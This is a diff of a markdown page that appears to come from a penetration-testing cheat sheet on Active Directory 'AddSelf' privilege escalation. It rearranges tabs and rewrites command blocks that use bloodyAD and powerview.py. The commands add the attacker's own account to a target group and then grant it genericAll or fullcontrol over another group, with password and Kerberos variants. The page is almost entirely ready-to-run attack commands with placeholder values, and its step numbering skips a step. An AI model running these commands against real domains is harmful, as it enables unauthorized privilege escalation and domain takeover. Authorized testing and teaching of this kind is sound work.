@@ -6,65 +6,68 @@ tags: ["addself", "active directory", "ad", "domain controller", "Windows", "pow
 
 ### Privesc #1: Add self to group (From Linux)
 
-{{< tab set1 tab1 active >}}powerview.py{{< /tab >}}
-{{< tab set1 tab2 >}}bloodyAD{{< /tab >}}
+{{< tab set1 tab1 active >}}bloodyAD{{< /tab >}}
+{{< tab set1 tab2 >}}powerview.py{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
+#### 1. Add self to group
 
 ```console
-# Connect
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN>'
-```
-
-```console
-# Add self to group
-Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME>
-```
-
-```console
-# Check
-Get-DomainGroupMember -Identity <TARGET_GROUP>
-```
-
-```console
-# Exit and login again to apply changes
-Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol
-```
-
-```console
-# Check
-Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where 'SecurityIdentifier contains <USERNAME>'
-```
-
-</div>
-
-<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
-
-{{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
-
-<div>
-
-```console
-# Add self to group
-python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
+# With password
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember <GROUP> '<USER>'
 ```
 
 ```console
 # With Kerberos
-python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -k --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember <GROUP> '<USER>'
+```
+
+#### 2. Add genericAll over target group
+
+```console
+# With password
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
 ```console
-# After getting full control of target group (e.g. TARGET_GROUP has genericall over ANOTHER_GROUP)
-python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC> add genericAll 'OU=<ANOTHER_GROUP>,DC=<EXAMPLE>,DC=<COM>' <USERNAME>
+# With Kerberos
+python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
-
-</div>
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
 {{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
 
-<br>
+#### 1. Connect
+
+```console
+sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```
+
+#### 2. Add self to group
+
+```console
+Add-DomainGroupMember -Identity <GROUP> -Members '<USER>'
+```
+
+```console
+# Check
+Get-DomainGroupMember -Identity <GROUP>
+```
+
+#### 4. Add fullcontrol over target group
+
+```console
+# Exit and login again to apply changes
+Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<USER>' -Rights fullcontrol
+```
+
+```console
+# Check
+Get-DomainObjectAcl -Identity <TARGET_USER> -Where 'SecurityIdentifier contains <USER>'
+```
+
+<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
+
+{{< /tabcontent >}}
